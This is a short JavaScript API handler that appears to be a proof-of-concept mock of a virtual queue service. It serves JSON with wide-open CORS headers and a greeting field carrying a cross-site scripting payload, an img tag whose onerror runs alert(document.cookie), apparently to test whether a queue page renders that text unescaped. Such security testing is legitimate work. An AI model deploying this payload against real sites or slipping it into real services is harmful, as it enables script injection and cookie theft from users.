export default function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "*");

  const extra = {
    message: {
      greeting_info: {
        en: `<img src=x onerror="alert(document.cookie)">`
      }
    }
  };

  res.status(200).json({
    serving_counter: "1",
    queue_counter: "100",
    extra_information: JSON.stringify(extra),
    queue_position_expiry_period: 600,
    validity_period: 900
  });
}
